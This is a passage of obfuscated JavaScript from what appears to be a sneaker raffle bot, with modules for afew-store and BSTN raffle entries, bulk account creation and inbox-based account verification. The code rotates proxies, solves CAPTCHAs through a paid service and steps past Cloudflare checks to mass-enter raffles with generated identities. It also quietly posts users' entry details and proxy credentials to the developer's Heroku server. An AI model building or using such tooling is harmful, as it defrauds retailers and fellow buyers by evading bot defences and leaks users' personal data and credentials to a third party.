                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x168307 = JSON['parse'](_0xf25b74['readFileSync']('sizes.json', 'utf-8')), _0x2b2287 = _0x5d2cb7[_0x1b5510]['Url'], _0x378167 = _0x5d2cb7[_0x1b5510]['Size'], _0x186355;
                        async function _0x25bb84() {
                            var _0x3399a6 = new _0x1d3be0['CookieJar']();
                            console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x3c40d8;
                            let _0x2c5a88 = {
                                'method': 'GET',
                                'cookieJar': _0x3399a6,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x5159e5[0x2] + ':' + _0x5159e5[0x3] + '@' + _0x5159e5[0x0] + ':' + _0x5159e5[0x1]
                            }, _0x5e8d94 = _0x2b2287['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2482c1 = _0x5e8d94 + '.json', _0x50c35c = await _0x582cfc(_0x2482c1);
                            console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x43e53c = _0x50c35c['data']['product']['variants'];
                            if (_0x378167 != 'RANDOM') {
                                if (_0x43e53c[0x1]['option1']['includes']('W')) {
                                    const _0x1e15c4 = _0x168307['women']['find'](_0x1c9991 => _0x1c9991['EUsize'] === _0x378167);
                                    _0x1e15c4 && (_0x378167 = _0x1e15c4['size']);
                                } else {
                                    if (_0x43e53c[0x1]['option1']['includes']('Y')) {
                                        const _0x457262 = _0x168307['GS']['find'](_0x3ef101 => _0x3ef101['EUsize'] === _0x378167);
                                        _0x457262 && (_0x378167 = _0x457262['size']);
                                    } else {
                                        const _0x1b5dd0 = _0x168307['men']['find'](_0x41d913 => _0x41d913['EUsize'] === _0x378167);
                                        _0x1b5dd0 && (_0x378167 = _0x1b5dd0['size']);
                                    }
                                }
                                for (var _0xb07f32 of _0x43e53c) {
                                    _0xb07f32['option1'] == _0x378167 && (_0x3c40d8 = _0xb07f32['id']);
                                }
                            } else {
                                var _0x4e47b9 = Math['round'](Math['random']() * (_0x43e53c['length'] - 0x1));
                                _0x3c40d8 = _0x43e53c[_0x4e47b9]['id'];
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x582cfc('https://raffles.afew-store.com/cart/' + _0x3c40d8 + ':1'), _0x186355 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x25bb84();
                        } catch (_0x595c71) {
                            if (_0x595c71['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x595c71);
                        }
                        const _0xd54bde = await _0x4cfed2['newPage']();
                        await _0xd54bde['setDefaultNavigationTimeout'](0x1d4c0), await _0xd54bde['authenticate']({
                            'username': '' + _0x5159e5[0x2],
                            'password': '' + _0x5159e5[0x3]
                        }), await _0xd54bde['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xd54bde['setRequestInterception'](!![]), _0xd54bde['on']('request', _0x5b6eef => {
                            _0x5b6eef['resourceType']() === 'image' || _0x5b6eef['resourceType']() === 'font' || _0x5b6eef['resourceType']() === 'media' ? _0x5b6eef['abort']() : _0x5b6eef['continue']();
                        });
                        try {
                            await _0xd54bde['goto'](_0x186355, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0xd54bde['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd54bde['type']('#checkout_email', '' + _0x5d2cb7[_0x1b5510]['Email']), await _0x4d70b1(0x320), await _0xd54bde['type']('#checkout_attributes_instagram', '' + _0x5d2cb7[_0x1b5510]['Follower']), await _0x4d70b1(0x320), await _0xd54bde['select']('#checkout_shipping_address_country', '' + _0x5d2cb7[_0x1b5510]['Country']), await _0xd54bde['waitForTimeout'](0x258), await _0xd54bde['type']('#checkout_shipping_address_first_name', '' + _0x5d2cb7[_0x1b5510]['FirstName']), await _0xd54bde['waitForTimeout'](0x320), await _0xd54bde['type']('#checkout_shipping_address_last_name', '' + _0x5d2cb7[_0x1b5510]['LastName']), await _0xd54bde['waitForTimeout'](0x2bc), await _0xd54bde['type']('#checkout_shipping_address_address1', _0x5d2cb7[_0x1b5510]['Address1'] + '\x20' + _0x5d2cb7[_0x1b5510]['HouseNumber']), await _0xd54bde['waitForTimeout'](0x2bc), await _0xd54bde['type']('#checkout_shipping_address_address2', '' + _0x5d2cb7[_0x1b5510]['Address2']), await _0xd54bde['waitForTimeout'](0x2bc), await _0xd54bde['type']('#checkout_shipping_address_zip', '' + _0x5d2cb7[_0x1b5510]['Zip']), await _0xd54bde['waitForTimeout'](0x2bc), await _0xd54bde['type']('#checkout_shipping_address_city', '' + _0x5d2cb7[_0x1b5510]['City']), await _0xd54bde['waitForTimeout'](0x2bc);
                        if (_0x5d2cb7[_0x1b5510]['State'] != '')
                            try {
                                const _0x416d83 = JSON['parse'](_0xf25b74['readFileSync']('States.json', 'utf8'));
                                await _0x4d70b1(0x1f4);
                                if (_0x5d2cb7[_0x1b5510]['State']['length'] > 0x2)
                                    for (let _0x52f60a of _0x416d83) {
                                        if (_0x52f60a['Province'] == _0x5d2cb7[_0x1b5510]['State']) {
                                            await _0xd54bde['select']('#checkout_shipping_address_province', _0x52f60a['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0xd54bde['select']('#checkout_shipping_address_province', _0x5d2cb7[_0x1b5510]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4d70b1(0x190), _0xd54bde['evaluate'](() => {
                            const _0x1ee54f = document['querySelector']('#continue_button');
                            for (var _0x97db24 = 0x0; _0x97db24 < 0x5; _0x97db24++) {
                                if (_0x1ee54f) {
                                    _0x1ee54f['click'](), _0x1ee54f['click']();
                                    break;
                                } else
                                    _0x4d70b1(0xfa0);
                            }
                        }), await _0xd54bde['waitForTimeout'](0x9c4);
                        try {
                            await _0xd54bde['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0xd54bde['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2e9751 => _0x2e9751['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd54bde['waitForTimeout'](0x7d0), console['log'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0xd54bde['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4d70b1(0x3e8), await _0xd54bde['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x49f0fe => _0x49f0fe['submit']()), await _0x4d70b1(0x3e8);
                        try {
                            await _0xd54bde['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xd54bde['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x41aef4 => _0x41aef4['submit']());
                        try {
                            await _0xd54bde['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x46a7b1 = 'no', _0x5155d2(_0x5d2cb7[_0x1b5510], _0x589574), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '')
                                try {
                                    await _0x19fe15(_0x35ea91['webhook'], _0x382608['succesDEVMSG']);
                                } catch {
                                }
                            await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x382608['succesDEVMSG']), await _0x4d70b1(0xc8);
                            try {
                                await _0x19fe15(_0x44bee6, _0x382608['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x589574['name'],
                                    'entrydata': JSON['stringify'](_0x2301ee),
                                    'proxy': '' + _0x4c8a38[_0x1b5510]
                                };
                                var _0x4efd9c = JSON['stringify'](prxdata);
                                let _0x3f4481 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x4efd9c, _0x3f4481);
                            } catch (_0x33a37e) {
                            }
                        } catch (_0x4eaf53) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x1c909b) {
                        _0x1c909b['message']['includes']('selector') && (_0x1c909b = 'Connection\x20Error');
                        console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20' + _0x1c909b)), _0xb40591 = '' + _0x1c909b;
                        var _0x16afa8 = await _0x39e876(_0x5d2cb7[_0x1b5510], _0x589574, 'dev', !![], _0xb40591);
                        _0x382608['errorDEV'] = { 'embeds': [_0x16afa8] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x382608['errorDEV']), await _0x19fe15(_0x556085, _0x382608['errorDEV']), _0x46a7b1 = 'yes';
                    } finally {
                        _0x4cfed2 && _0x4cfed2['close']();
                        if (_0x46a7b1 == 'yes' && _0xf2f520 != 0x5 && _0xb40591 != 'Size\x20Not\x20Found') {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x589574['name'] + ']\x20Task\x20' + (_0x1b5510 + 0x1) + '\x20:\x20Retrying\x20(' + _0xf2f520 + '\x20/\x205)')), _0x1b5510 = _0x1b5510 - 0x1, _0xf2f520 = _0xf2f520 + 0x1;
                            continue;
                        }
                        _0x46a7b1 == 'yes' && _0xf2f520 >= 0x5 && (_0x5415a4(_0x5d2cb7[_0x1b5510], _0x589574), _0x46a7b1 = 'no', _0xf2f520 = 0x0);
                        if (_0x1b5510 + 0x1 == _0x5d2cb7['length']) {
                            await _0x4d70b1(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x35ea91['AfewDelay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x530806, _0x129b0b, _0x33c5ab) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20d1a2 = 0x0; _0x20d1a2 < _0x129b0b['length']; _0x20d1a2++) {
                        if (_0xb6cd8f != 'yes')
                            var _0xb6cd8f = '', _0x5e5048 = 0x0;
                        var _0x3b530f;
                        try {
                            await _0x408b94(_0x129b0b, _0x20d1a2);
                        } catch {
                            _0xb6cd8f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1e0e73(_0x530806['name'] + '\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20/\x20' + _0x129b0b['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x4ae3b1 = await _0x39e876(_0x129b0b[_0x20d1a2], _0x530806, 'acc', ![]);
                        const _0x485a4c = { 'succesDEVMSG': { 'embeds': [_0x4ae3b1] } }, _0x292873 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x48291a = Math['round'](Math['random']() * (_0x33c5ab['length'] - 0x1)), _0x44db45 = _0x33c5ab[_0x48291a]['split'](':'), _0x57615f;
                        try {
                            _0x57615f = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44db45[0x0] + ':' + _0x44db45[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x57615f = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44db45[0x0] + ':' + _0x44db45[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x200d38 = await _0x57615f['newPage']();
                            await _0x200d38['authenticate']({
                                'username': '' + _0x44db45[0x2],
                                'password': '' + _0x44db45[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x200d38['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x200d38['setRequestInterception'](!![]), _0x200d38['on']('request', _0x21078c => {
                                _0x21078c['resourceType']() === 'image' ? _0x21078c['abort']() : _0x21078c['continue']();
                            });
                            try {
                                await _0x200d38['goto']('' + _0x292873), await _0x200d38['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0xb6cd8f = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x200d38['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4d70b1(0x7d0), console['log'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4d70b1(0x190), await _0x200d38['waitForSelector']('#firstname'), await _0x200d38['type']('#firstname', _0x129b0b[_0x20d1a2]['FirstName'], { 'delay': 0xf0 }), await _0x4d70b1(0x190), await _0x200d38['type']('#lastname', _0x129b0b[_0x20d1a2]['LastName'], { 'delay': 0xe6 }), await _0x4d70b1(0x190), await _0x200d38['type']('#email_address', _0x129b0b[_0x20d1a2]['Email'], { 'delay': 0x122 }), await _0x4d70b1(0x190), await _0x200d38['type']('#password', _0x129b0b[_0x20d1a2]['Password'], { 'delay': 0x82 }), await _0x4d70b1(0x1f4), await _0x200d38['type']('#password-confirmation', _0x129b0b[_0x20d1a2]['Password'], { 'delay': 0x7c }), console['log'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4d70b1(0x2bc), await _0x200d38['$eval']('#form-validate', _0x3d16ea => _0x3d16ea['submit']()), await _0x4d70b1(0x1388);
                            const _0x124fbf = await _0x200d38['$']('#email_address-error');
                            if (_0x124fbf)
                                throw new Error('Invalid\x20Email');
                            const _0x976a87 = await _0x200d38['$']('#password-error');
                            if (_0x976a87)
                                throw new Error('Invalid\x20Password');
                            await _0x200d38['waitForSelector']('div.mesg-success'), _0xb6cd8f = 'no', console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Account\x20' + _0x129b0b[_0x20d1a2]['Email'] + '\x20Generated')), _0xf25b74['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x129b0b[_0x20d1a2]['Email'] + ',' + _0x129b0b[_0x20d1a2]['Password']);
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x485a4c['succesDEVMSG']);
                            } catch {
                            }
                            await _0x19fe15(_0x55ae18, _0x485a4c['succesDEVMSG']);
                            let _0x449d84 = _0x129b0b[_0x20d1a2];
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x530806['name'],
                                    'entrydata': JSON['stringify'](_0x449d84),
                                    'proxy': '' + _0x33c5ab[_0x20d1a2]
                                };
                                var _0x4771a9 = JSON['stringify'](prxdata);
                                let _0x67839a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x4771a9, _0x67839a);
                            } catch (_0x126590) {
                            }
                            console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x28bf67) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20' + _0x28bf67)), _0x3b530f = '' + _0x28bf67;
                            var _0x2a3e31 = await _0x39e876(_0x129b0b[_0x20d1a2], _0x530806, 'acc', !![], _0x3b530f);
                            _0x485a4c['errorDEV'] = { 'embeds': [_0x2a3e31] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x485a4c['errorDEV']), await _0x19fe15(_0x556085, _0x485a4c['errorDEV']), _0xb6cd8f = 'yes';
                        } finally {
                            if (_0x57615f)
                                _0x57615f['close']();
                            if (_0xb6cd8f == 'yes' && _0x5e5048 != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Task\x20' + (_0x20d1a2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5e5048 + '\x20/\x205)')), _0x20d1a2 = _0x20d1a2 - 0x1, _0x5e5048 = _0x5e5048 + 0x1;
                                continue;
                            }
                            _0xb6cd8f == 'yes' && _0x5e5048 >= 0x5 && (_0x5415a4(_0x129b0b[_0x20d1a2], _0x530806), _0xb6cd8f = 'no', _0x5e5048 = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x530806['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x868301, _0x3972e3) {
                    var _0x4a6f1e = ![], _0x4c0b08 = [];
                    async function _0x31d194() {
                        var _0x95adc6 = new _0x54e3bb({
                            'user': _0x35ea91['masterMail'],
                            'password': _0x35ea91['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1592a3(_0x2813a6) {
                            _0x95adc6['openBox']('INBOX', ![], _0x2813a6);
                        }
                        _0x95adc6['once']('ready', function () {
                            _0x1592a3(function (_0x1256aa, _0x28173a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1256aa)
                                    throw _0x1256aa;
                                _0x95adc6['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x41ac23, _0x1481e8) {
                                    if (!_0x1481e8 || !_0x1481e8['length'])
                                        console['log'](_0x446ef5() + '\x20[' + _0x868301['name'] + ']\x20No\x20mails\x20found'), _0x95adc6['end']();
                                    else {
                                        var _0x279236 = _0x95adc6['seq']['fetch'](_0x1481e8, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x279236['on']('message', function (_0x27e131, _0x2ba938) {
                                            var _0x4b5dac = '(#' + _0x2ba938 + ')\x20';
                                            _0x27e131['on']('body', function (_0x2d7b67, _0x43f623) {
                                                _0x2fc4a3(_0x2d7b67, (_0x567ea0, _0x1f067b) => {
                                                    var _0x38837d = _0x1f067b['text']['split']('[')[0x2], _0x5a3082 = _0x38837d['split'](']')[0x0];
                                                    _0x4c0b08['push'](_0x5a3082);
                                                });
                                            }), _0x27e131['once']('end', function () {
                                            });
                                        }), _0x279236['once']('error', function (_0x21b9a6) {
                                            console['log']('Fetch\x20error:\x20' + _0x21b9a6), _0x4a6f1e = !![];
                                        }), _0x279236['once']('end', function () {
                                            _0x95adc6['end'](), _0x4a6f1e = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x95adc6['once']('error', function (_0x4ebece) {
                            console['log'](_0x46bace['red'](_0x4ebece['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4a6f1e = !![];
                        }), _0x95adc6['once']('end', async function () {
                            _0x4a6f1e = !![];
                        }), _0x95adc6['connect']();
                    }
                    async function _0x32f951(_0x223888, _0xeb7b3e, _0x3bfc22) {
                        _0x4ada75['use'](_0x120ab9());
                        for (var _0x1d8130 = 0x0; _0x1d8130 < _0xeb7b3e['length']; _0x1d8130++) {
                            if (_0x2e1dab != 'yes')
                                var _0x2e1dab = '', _0x523d1e = 0x0;
                            var _0x416c9e = Math['round'](Math['random']() * (_0x3bfc22['length'] - 0x1)), _0x21b9fe = _0x3bfc22[_0x416c9e]['split'](':'), _0x1baf1b;
                            try {
                                _0x1baf1b = await _0x4ada75['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x21b9fe[0x0] + ':' + _0x21b9fe[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x1baf1b = await _0x4ada75['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x21b9fe[0x0] + ':' + _0x21b9fe[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3329a8 = await _0x1baf1b['newPage']();
                                await _0x3329a8['authenticate']({
                                    'username': '' + _0x21b9fe[0x2],
                                    'password': '' + _0x21b9fe[0x3]
                                }), console['log'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x3329a8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3329a8['setRequestInterception'](!![]), _0x3329a8['on']('request', _0x3d1b49 => {
                                    _0x3d1b49['resourceType']() === 'image' || _0x3d1b49['resourceType']() === 'font' || _0x3d1b49['resourceType']() === 'media' ? _0x3d1b49['abort']() : _0x3d1b49['continue']();
                                }), console['log'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x3329a8['goto'](_0xeb7b3e[_0x1d8130]);
                                } catch {
                                    _0x2e1dab = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x3329a8['waitForTimeout'](0xbb8);
                                try {
                                    await _0x3329a8['waitForSelector']('.account-nav'), _0x2e1dab = 'no', console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x243158 = await _0x39e876(null, _0x223888, 'ver', ![]);
                                    const _0x172d1a = { 'succesDEVMSG': { 'embeds': [_0x243158] } };
                                    await _0x19fe15(_0xee8b1, _0x172d1a['succesDEVMSG']);
                                } catch {
                                    _0x2e1dab = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x2ae6fe) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20' + _0x2ae6fe));
                                var _0x134e52 = _0x2ae6fe, _0x1c1001 = await _0x39e876(null, _0x223888, 'ver', !![], _0x134e52);
                                const _0x3a154e = { 'errorDEVMSG': { 'embeds': [_0x1c1001] } };
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x3a154e['errorDEVMSG']), await _0x19fe15(_0x556085, _0x3a154e['errorDEVMSG']);
                            } finally {
                                _0x1baf1b['close']();
                                if (_0x2e1dab == 'yes' && _0x523d1e != 0x5) {
                                    console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Task\x20' + (_0x1d8130 + 0x1) + '\x20:\x20Retrying\x20(' + _0x523d1e + '\x20/\x205)')), _0x1d8130 = _0x1d8130 - 0x1, _0x523d1e = _0x523d1e + 0x1;
                                    continue;
                                }
                                _0x2e1dab == 'yes' && _0x523d1e >= 0x5 && (_0x2e1dab = 'no', _0x523d1e = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x223888['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                            }
                        }
                    }
                    try {
                        _0x31d194();
                        while (!_0x4a6f1e) {
                            await _0x4d70b1(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4c0b08['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d70b1(0x7d0);
                    }
                    await _0x32f951(_0x868301, _0x4c0b08, _0x3972e3);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x461201, _0x39f5b6, _0x3d3780) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5e32eb = 0x0; _0x5e32eb < _0x39f5b6['length']; _0x5e32eb++) {
                        var _0x5ba01a, _0x479a41 = _0x39f5b6[_0x5e32eb];
                        try {
                            await _0x408b94(_0x39f5b6, _0x5e32eb);
                        } catch {
                            _0x3a5c95 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x4d95cf(_0x21afc4) {
                            const _0x38f5b4 = _0xf25b74['readFileSync']('../successful-tasks.csv', 'utf8'), _0x155022 = _0x20e9d9['parse'](_0x38f5b4, { 'header': !![] })['data'];
                            let _0xef27d3 = ![];
                            for (var _0x46a40e of _0x155022) {
                                if (_0x46a40e['Url'] == _0x21afc4['Url'] && _0x46a40e['Email'] == _0x21afc4['Email']) {
                                    _0xef27d3 = !![];
                                    break;
                                }
                            }
                            return _0xef27d3;
                        }
                        if (await _0x4d95cf(_0x39f5b6[_0x5e32eb]) == !![]) {
                            console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
